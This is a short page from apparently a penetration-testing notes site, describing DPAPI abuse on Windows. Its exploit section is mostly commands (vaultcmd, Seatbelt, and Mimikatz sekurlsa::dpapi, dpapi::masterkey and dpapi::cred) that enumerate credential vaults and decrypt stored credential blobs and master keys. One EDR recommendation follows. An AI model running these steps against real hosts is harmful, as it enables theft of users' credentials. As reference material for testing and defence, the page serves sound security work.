---
layout: default
title: Data Protection API Abuse
parent: Windows
nav_order: 4
permalink: /windows/dpapi/
---

# Data Protection API Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Windows hosts have 2 vaults storing encrypted credentials:
* Web Credentials (for browsers).
* Windows Credentials (for Windows services).

If you are local administrator of a Windows host, you can decrypt these credentials (also named "blobs").

## Prerequisites

* Local administrator rights on the targeted system.

## Exploit

First, enumerate the currently logged on user's vaults. You can do it manually with `vaultcmd` builtin or using [Seatbelt](https://github.com/GhostPack/Seatbelt).

```powershell
vaultcmd /list
vaultcmd /listcreds:"Web Credentials" /all
vaultcmd /listcreds:"Windows Credentials" /all

./Seatbelt.exe WindowsVault
```

Encrypted credentials are stored in `C:\Users\$username\AppData\Local\Microsoft\Credentials\`. List them manually, or using [Seatbelt](https://github.com/GhostPack/Seatbelt).

```powershell
ls $Env:LOCALAPPDATA\Microsoft\Credentials\

./Seatbelt.exe WindowsCredentialFiles
```

The advantage of using [Seatbelt](https://github.com/GhostPack/Seatbelt) is it gives the GUID of the key used to encrypt blobs. These keys are stored **encrypted** in `C:\Users\$username\AppData\Roaming\Microsoft\Protect\$sid\`.

```powershell
ls $Env:APPDATA\Microsoft\Protect\$sid\
```

So let's decrypt this key! It might be cached on the host so you can get it with [Mimikatz](https://github.com/gentilkiwi/mimikatz).

```bash
sekurlsa::dpapi
```

If it's not cached, you can - *kindly* - ask the domain via the Microsoft BackupKey Remote Protocol (MS-BKRP).

{: .important }
> You must do it as `$username` or it will fail, so impersonate him first.

```powershell
dpapi::masterkey /in:C:\Users\$username\AppData\Roaming\Microsoft\Protect\$sid\$keyGUID /rpc
```

Now you have the key decrypted, you can decrypt the corresponding blob.

```powershell
dpapi::cred /in:C:\Users\$username\AppData\Local\Microsoft\Credentials\$blob /masterkey:$key
```

## Recommendations

- [ ] Enforce EDR on hosts to prevent and detect usage of tools such as [Mimikatz](https://github.com/gentilkiwi/mimikatz).